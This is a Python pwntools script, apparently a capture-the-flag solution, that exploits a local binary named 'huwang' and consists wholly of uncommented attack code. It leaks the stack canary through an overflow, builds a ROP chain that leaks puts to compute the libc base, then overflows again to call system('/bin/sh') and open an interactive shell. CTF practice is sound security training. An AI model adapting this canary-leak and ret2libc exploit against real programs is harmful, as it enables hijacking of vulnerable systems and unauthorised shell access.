from pwn import *
context.log_level = 'debug'

p = process('./huwang')

def sixsixsix(name, rd, secret):
    p.recvuntil('>> \n')
    p.sendline('666')
    p.recvuntil('name\n')
    p.send(name)
    p.recvuntil('secret?\n')
    p.sendline('y')
    p.recvuntil('secret:\n')
    p.sendline(str(rd))
    
    p.recvuntil('secret\n')
    p.send(secret)

def GameStart():
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    sixsixsix('a'*0x19, 1, '4ae71336e44bf9bf79d2752e234818a5'.decode('hex'))
    p.recvuntil('a'*0x19)
    canary = u64('\x00' + p.recv(7))
    p.recvuntil('occupation?\n')
    p.send('a' * 0xff)
    p.recvuntil('[Y/N]\n')
    p.sendline('Y')
    shellcode = 'a' * 0x108 + p64(canary) + p64(0)
    shellcode += p64(0x0000000000401573) + p64(0x0602F70) + p64(0x40101C)
    p.send(shellcode)
    p.recvuntil('Congratulations, ')
    libc_addr = u64(p.recvn(6) + '\x00' * 2) - libc.symbols['puts']
    p.recvuntil('occupation?\n')
    p.send('a' * 0xff)
    p.recvuntil('[Y/N]\n')
    p.sendline('Y')
    shellcode = 'a' * 0x108 + p64(canary) + p64(0)
    shellcode += p64(0x0000000000401573) + p64(next(libc.search('/bin/sh')) + libc_addr) + p64(libc_addr + libc.symbols['system'])
    p.send(shellcode)


    p.interactive()

if __name__ == '__main__':
    GameStart()
